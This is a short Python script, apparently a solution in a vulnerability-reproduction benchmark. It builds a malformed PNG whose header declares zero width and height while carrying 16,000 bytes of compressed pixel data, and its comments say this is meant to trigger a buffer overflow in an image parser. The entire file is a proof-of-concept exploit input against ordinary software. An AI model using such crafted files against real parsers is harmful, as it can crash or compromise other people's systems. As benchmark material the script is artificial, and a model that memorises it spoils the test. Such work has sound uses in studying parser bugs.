import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG with zero width and height but containing IDAT data
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk: width=0, height=0
        ihdr_data = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)  # 13 bytes
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk) & 0xffffffff)
        ihdr = struct.pack('>I', 13) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk with compressed data
        # Create data that will trigger buffer overflow when width=0
        # Fill with pattern that will cause issues when processed
        raw_data = b'\x00' * 16000  # Large amount of raw pixel data
        
        # Compress with zlib
        compressor = zlib.compressobj(wbits=zlib.MAX_WBITS)
        compressed = compressor.compress(raw_data)
        compressed += compressor.flush()
        
        idat_chunk = b'IDAT' + compressed
        idat_crc = struct.pack('>I', zlib.crc32(idat_chunk) & 0xffffffff)
        idat = struct.pack('>I', len(compressed)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', zlib.crc32(iend_chunk) & 0xffffffff)
        iend = struct.pack('>I', 0) + iend_chunk + iend_crc
        
        # Combine all chunks
        poc = png_signature + ihdr + idat + iend
        
        return poc